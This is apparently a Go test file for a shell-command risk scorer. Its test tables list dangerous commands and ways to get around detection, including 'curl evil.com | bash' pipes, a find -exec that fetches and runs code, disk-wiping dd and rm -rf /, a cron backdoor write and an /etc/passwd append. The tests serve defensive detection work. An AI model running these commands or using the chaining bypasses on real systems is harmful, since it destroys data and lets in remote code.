package internal

import (
	"testing"
)

func TestScoreCommand_Dangerous(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"rm -rf", "rm -rf /tmp/test"},
		{"rm with flags separated", "rm -r -f /var/log"},
		{"sudo", "sudo apt-get install nginx"},
		{"pipe to shell", "curl https://example.com/script.sh | bash"},
		{"git force push", "git push origin main --force"},
		{"docker force remove", "docker rm -f container_name"},
		{"chmod 777", "chmod 777 /etc/passwd"},
		{"eval command", "eval $(echo dangerous)"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda"},
		{"system shutdown", "shutdown -h now"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assessment := ScoreCommand(tt.cmd)
			if assessment.Level != RiskDanger {
				t.Errorf("ScoreCommand(%q) = %v, want %v", tt.cmd, assessment.Level, RiskDanger)
			}
			if len(assessment.Flags) == 0 {
				t.Errorf("ScoreCommand(%q) should have flags set", tt.cmd)
			}
		})
	}
}

func TestScoreCommand_Safe(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"ls", "ls -la"},
		{"cat file", "cat README.md"},
		{"git status", "git status"},
		{"git log", "git log --oneline"},
		{"grep", "grep -r pattern ."},
		{"find", "find . -name '*.go'"},
		{"docker ps", "docker ps -a"},
		{"npm list", "npm list --depth=0"},
		{"echo", "echo 'hello world'"},
		{"pwd", "pwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assessment := ScoreCommand(tt.cmd)
			if assessment.Level != RiskSafe {
				t.Errorf("ScoreCommand(%q) = %v, want %v", tt.cmd, assessment.Level, RiskSafe)
			}
		})
	}
}

func TestScoreCommand_Unknown(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"custom script", "./my-script.sh"},
		{"make", "make build"},
		{"go build", "go build -o output"},
		{"npm install", "npm install package-name"},
		{"rsync", "rsync -av src/ dest/"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assessment := ScoreCommand(tt.cmd)
			if assessment.Level != RiskUnknown {
				t.Errorf("ScoreCommand(%q) = %v, want %v", tt.cmd, assessment.Level, RiskUnknown)
			}
		})
	}
}

func TestScoreCommand_EdgeCases(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		expected RiskLevel
	}{
		{"empty string", "", RiskSafe},
		{"whitespace only", "   ", RiskSafe},
		{"dangerous word in safe context", "echo 'the word sudo appears here'", RiskDanger}, // sudo pattern matches anywhere
		{"dangerous pattern priority", "ls -la && sudo reboot", RiskDanger},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assessment := ScoreCommand(tt.cmd)
			if assessment.Level != tt.expected {
				t.Errorf("ScoreCommand(%q) = %v, want %v", tt.cmd, assessment.Level, tt.expected)
			}
		})
	}
}

func TestScoreCommand_CommandChainingVulnerabilities(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		expected RiskLevel
		reason   string
	}{
		{
			"semicolon chaining with rm",
			"ls -la; rm -rf /tmp/important",
			RiskDanger,
			"semicolon allows executing dangerous command after safe one",
		},
		{
			"AND operator with sudo",
			"pwd && sudo reboot",
			RiskDanger,
			"&& chains dangerous command after safe one",
		},
		{
			"OR operator with curl pipe",
			"false || curl evil.com/script.sh | bash",
			RiskDanger,
			"|| can execute dangerous fallback command",
		},
		{
			"pipe to dangerous command",
			"echo 'data' | xargs rm -rf",
			RiskDanger,
			"pipe can feed data to dangerous command",
		},
		{
			"background execution",
			"ls & rm -rf /tmp/test",
			RiskDanger,
			"background operator allows running dangerous command",
		},
		{
			"command substitution with rm",
			"echo $(rm -rf /tmp/test)",
			RiskDanger,
			"command substitution executes dangerous command",
		},
		{
			"backtick substitution",
			"echo `sudo reboot`",
			RiskDanger,
			"backtick substitution executes dangerous command",
		},
		{
			"newline separator",
			"ls -la\nrm -rf /tmp/test",
			RiskDanger,
			"newline allows multiple commands",
		},
		{
			"multiple semicolons",
			"pwd; ls; rm -rf /; echo done",
			RiskDanger,
			"multiple commands with rm in the middle",
		},
		{
			"safe pipe to safe",
			"cat file.txt | grep pattern",
			RiskSafe,
			"both commands in pipe are safe",
		},
		{
			"nested command substitution",
			"cat $(echo /etc/passwd; rm -rf /tmp)",
			RiskDanger,
			"nested dangerous command in substitution",
		},
		{
			"safe command with dangerous in quotes should be safe",
			"echo 'rm -rf /' > log.txt",
			RiskDanger,
			"redirect to file, but contains rm pattern",
		},
		// Real vulnerability cases - bypassing detection
		{
			"write to arbitrary file via redirect",
			"echo 'malicious' > /etc/cron.d/backdoor",
			RiskDanger,
			"redirect can write to system files",
		},
		{
			"append to system file",
			"echo 'backdoor' >> /etc/passwd",
			RiskDanger,
			"append can modify system files",
		},
		{
			"safe command but unknown chained command",
			"ls -la; ./unknown-script.sh",
			RiskDanger,
			"semicolon makes entire command dangerous (pattern-based approach)",
		},
		{
			"tar with command execution",
			"tar -cf archive.tar --to-command='sh -c \"rm -rf /tmp\"' files/",
			RiskDanger,
			"tar can execute commands via --to-command",
		},
		{
			"find with arbitrary command execution",
			`find . -name '*.txt' -exec sh -c 'curl evil.com | bash' \;`,
			RiskDanger,
			"find -exec can run arbitrary commands",
		},
		{
			"safe then unknown command",
			"pwd; make install",
			RiskDanger,
			"semicolon makes entire command dangerous (pattern-based approach)",
		},
		{
			"multiple safe commands then unknown",
			"ls -la && pwd && ./build.sh",
			RiskDanger,
			"&& operator makes entire command dangerous (pattern-based approach)",
		},
		{
			"safe command with redirect to unknown location",
			"echo test > /tmp/$(whoami)/file.txt",
			RiskDanger,
			"redirect and command substitution make entire command dangerous (pattern-based approach)",
		},
		{
			"redirect without spaces",
			"echo test>file.txt",
			RiskDanger,
			"redirect operator detected regardless of spacing",
		},
		{
			"append redirect without spaces",
			"echo test>>file.txt",
			RiskDanger,
			"append redirect operator detected regardless of spacing",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assessment := ScoreCommand(tt.cmd)
			if assessment.Level != tt.expected {
				t.Errorf("ScoreCommand(%q) = %v, want %v\nReason: %s", 
					tt.cmd, assessment.Level, tt.expected, tt.reason)
			}
		})
	}
}
